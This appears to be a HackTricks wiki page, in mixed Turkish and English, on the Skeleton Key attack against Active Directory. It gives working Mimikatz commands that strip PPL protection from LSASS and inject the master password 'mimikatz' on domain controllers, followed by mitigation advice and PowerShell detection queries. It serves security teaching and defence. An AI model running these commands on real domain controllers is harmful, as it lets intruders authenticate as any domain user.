# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

The **Skeleton Key attack** her domain controller'ın LSASS sürecine bir master parola enjekte ederek saldırganların **Active Directory kimlik doğrulamasını atlamasına** olanak tanıyan bir tekniktir. Enjekte edildikten sonra, varsayılan olarak **`mimikatz`** olan bu master parola, gerçek parolaları hâlâ çalışırken **herhangi bir domain kullanıcısı** olarak kimlik doğrulamak için kullanılabilir.

Key facts:

- Requires **Domain Admin/SYSTEM + SeDebugPrivilege** on every DC and must be **reapplied after each reboot**.
- Patches **NTLM** and **Kerberos RC4 (etype 0x17)** validation paths; AES-only realms or accounts enforcing AES will **not accept the skeleton key**.
- Can conflict with third‑party LSA authentication packages or additional smart‑card / MFA providers.
- The Mimikatz module accepts the optional switch `/letaes` to avoid touching Kerberos/AES hooks in case of compatibility issues.

### Yürütme

Klasik, PPL koruması olmayan LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Eğer **LSASS PPL olarak çalışıyorsa** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), LSASS'i yamalamadan önce korumayı kaldırmak için bir kernel sürücüsüne ihtiyaç vardır:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Enjeksiyondan sonra herhangi bir etki alanı hesabı ile kimlik doğrulaması yapın; ancak parola olarak `mimikatz` (veya operatörün belirlediği değer) kullanın. Çoklu **DC** ortamlarında bunu **tüm DC'lerde** tekrarlamayı unutmayın.

## Mitigations

- **Günlük izleme**
- System **Event ID 7045** (servis/sürücü kurulumu) — imzasız sürücüler için, ör. `mimidrv.sys`.
- **Sysmon**: Event ID 7 (`mimidrv.sys` sürücü yüklemesi); Event ID 10 ise sistem dışı süreçlerin `lsass.exe`'ye şüpheli erişimleri için.
- Güvenlik **Event ID 4673/4611** hassas ayrıcalık kullanımı veya LSA authentication package kayıt anomalileri için; DC'lerden RC4 (etype 0x17) kullanan beklenmeyen 4624 oturum açmalarıyla korele edin.
- **LSASS Sertleştirmesi**
- DC'lerde **RunAsPPL/Credential Guard/Secure LSASS**'i etkin tutun; saldırganları kernel‑mod sürücü dağıtımına zorlayarak (daha fazla telemetri, daha zor sömürü).
- Mümkünse eski **RC4**'ü devre dışı bırakın; Kerberos biletlerini AES ile kısıtlamak, skeleton key tarafından kullanılan RC4 hook yolunu engeller.
- Hızlı PowerShell aramaları:
- İmzalanmamış kernel sürücü kurulumlarını tespit edin: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Mimikatz sürücüsünü arayın: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Yeniden başlatma sonrası PPL'nin uygulandığını doğrulayın: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Ek kimlik bilgisi sertleştirme rehberi için bakınız [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## References

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
